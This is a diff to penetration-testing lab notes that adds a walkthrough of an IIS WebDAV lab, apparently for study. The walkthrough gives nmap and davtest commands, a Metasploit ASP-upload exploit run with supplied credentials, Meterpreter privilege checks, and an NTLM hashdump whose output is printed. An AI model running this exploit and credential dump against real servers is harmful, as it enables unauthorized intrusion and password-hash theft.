@@ -203,7 +203,7 @@ Progress: [=============================>] 100.0% of 1362 bytes succeeded.
 
 ------
 
-## Lab2
+## Lab 2
 
 > 🔬 [Windows: IIS Server: WebDav Metasploit](https://attackdefense.com/challengedetails?cid=2319)
 >
@@ -341,6 +341,59 @@ type flag.txt
 `d3aff16a801b4b7d36b4da1094bee345`
 
 ![](.gitbook/assets/image-20230310164250012.png)
+
+</details>
+
+------
+
+## Lab 3 (Extra)
+
+> [Windows: IIS Server Metasploit Backdoor](https://attackdefense.com/challengedetails?cid=2318)
+>
+> - Target IP: `10.4.23.148`
+> - IIS exploitation with Metasploit
+> - Credentials provided: `bob`:`password_123321`
+
+```bash
+nmap -sV 10.4.23.148
+nmap -p80 -sV --script http-enum 10.4.23.148
+davtest -auth bob:password_123321 -url http://10.4.23.148/webdav
+msfconsole
+```
+
+```bash
+use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS 10.4.23.148
+set HttpUsername bob
+set HttpPassword password_123321
+set PATH /webdav/meta.asp
+exploit
+```
+
+```bash
+getuid
+	Server username: NT AUTHORITY\SYSTEM
+hashdump
+	[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+migrate 5820
+
+hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
+bob:1008:aad3b435b51404eeaad3b435b51404ee:31b977436c6ea5bfa9ee65aaddb880d1:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+```
+
+<details>
+<summary>Reveal Flag - Administrator NTLM Hash is: 🚩</summary>
+
+
+
+`5c4d59391f656d5958dab124ffeabc20`
+
+![](.gitbook/assets/image-20230310170900244.png)
 
 </details>
 
